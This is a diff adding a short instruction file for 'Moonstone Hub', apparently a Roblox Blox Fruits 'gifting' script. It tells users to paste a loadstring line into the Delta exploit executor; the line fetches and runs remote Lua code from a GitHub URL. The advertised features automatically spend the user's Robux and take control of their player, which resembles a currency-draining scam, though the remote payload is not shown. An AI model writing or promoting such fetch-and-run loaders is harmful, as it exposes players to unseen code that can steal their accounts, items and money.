@@ -1,0 +1,25 @@
+-- MOONSTONE HUB
+-- Blox Fruits Gifting System
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/moonstone_hub.lua"))()
+
+**Features:**
+- One-click activation
+- Automatic fruit detection and gifting
+- Balance monitoring
+- Player movement control during gifting
+- Automatic script closure when balance is low
+
+**How to Use:**
+1. Copy the loadstring
+2. Open Delta executor
+3. Paste the loadstring
+4. Click Execute
+5. Click the "Activate Script" button when it appears
+
+**Requirements:**
+- Delta executor
+- Blox Fruits game
+- Sufficient Robux balance
+
+**Note:** Make sure you're in Blox Fruits before executing the script. 
